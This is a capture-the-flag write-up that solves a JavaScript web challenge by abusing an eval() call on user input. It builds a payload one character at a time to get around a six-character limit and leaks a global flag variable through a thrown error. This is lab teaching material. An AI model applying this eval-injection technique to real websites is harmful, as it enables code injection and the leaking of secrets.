## JS is the best

<img src="images/chall.png" width=400>

We are provided with a webpage where we have to correctly evaluate a series of JavaScript expressions to progress to stage 5, where we will be redirected to the flag endpoint.  

The first 3 stages are based on common JavaScript type coercion principles, and can be passed easily.  

However, when we reach the final stage, we are presented with an impossible expression.  

<img src="images/stage4.png" width=400>

Looking at the source code, we notice that stage 3 runs our input against an `eval()` call, which could potentially provide us with an RCE vector.  

Since the page doesn't change each time we submit an answer, we are able to send multiple payloads and hopefully affect external code to get the flag. The biggest caveat however, is that each payload is limited to a maximum of 6 characters, significantly limiting our options.  

<img src="images/eval.png" width=600>

We notice that both `flag` and `stage` are in the global scope, which we can gain access to via the `eval()` calls.  

<img src="images/globals.png" width=500>

My first idea was to assign a variable `v` with our desired payload (we have to build it character by character, but more on that later), then assign `eval` to a variable `b` and use `b` to invoke `v`.

However, this is not viable, as making a reference to `eval` using a variable leads to an indirect call, which means our payload will not affect any global variables

```js
v='stage=5'
eval(v)
```

The next thing we can do is try to leak the flag through an error. Since `flag` is a constant and doesn't require being changed, we don't have to worry about indirect calls not applying our changes.  

```js
v="throw '"+flag+"'"
eval(v)
```

To bypass the character limit, we can simply build our payload character by character.  

```js
f=flag
v="t"
v+="h"
v+="r"
v+="o"
v+="w"
v+="'"
v+=f
v+="'"
e=eval
e(v)
```

However, this is not sufficient, as we might notice that stage 3 actually makes 3 eval calls, and this may affect the way our payload is built. Ideally, we want only the first eval to be triggered, so we have to fail the first validation in the `if` statement.  

<img src="images/condition.png" width=400>

`eval()` will always return the string we assigned to the value, and the comparison will always evaluate to `false`, which will trigger the subsequent `eval()` calls.  

To prevent this, we can simply append a `1` to the back of each assignment, so that the `eval()` will always evaluate to `true`.  

However, since we still limited to 6 characters, we have to use an auxillary variable `b` to store the character, such that we can fit `;1` at the back of each assignment payload.  

```js
f=flag
v="t"
b="h"
v+=b;1
b="r"
v+=b;1
b="o"
v+=b;1
b="w"
v+=b;1
b="'"
v+=b;1
v+=f;1
b="'"
v+=b;1
```

After submitting the series of payloads, we are finally able to view the flag.  


<img src="images/flag.png" width=600>

